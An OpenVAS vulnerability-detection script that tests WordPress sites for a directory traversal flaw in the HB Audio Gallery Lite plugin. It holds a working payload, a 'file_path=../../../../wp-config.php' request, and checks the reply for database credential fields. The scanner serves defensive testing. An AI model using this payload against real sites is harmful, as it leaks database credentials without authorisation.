###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_hb_audio_gallery_lite_dir_trav_vuln.nasl 5231 2017-02-08 11:52:34Z teissa $
#
# Wordpress HB Audio Gallery Lite Directory Traversal Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807529");
  script_version("$Revision: 5231 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-02-08 12:52:34 +0100 (Wed, 08 Feb 2017) $");
  script_tag(name:"creation_date", value:"2016-04-01 13:19:26 +0530 (Fri, 01 Apr 2016)");
  script_name("Wordpress HB Audio Gallery Lite Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  HB Audio Gallery Lite plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Flaw is due to insufficient validation 
  of input via 'file_path' parameter to 'gallery/audio-download.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to download arbitrary files.

  Impact Level: Application");

  script_tag(name:"affected", value:"Wordpress Plugin HB Audio Gallery Lite 
  version 1.0.0");

  script_tag(name:"solution", value:"No solution or patch is available as of 
  08th February, 2017. Information regarding this issue will be updated once the
  solution details are available. For updates refer to
  https://fr.wordpress.org/plugins/hb-audio-gallery-lite");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/39589");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Vulnerable URL
url = dir + '/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?'
          + 'file_path=../../../../wp-config.php&file_size=10';

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"DB_NAME", extra_check:make_list("DB_USER", "DB_PASSWORD")))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
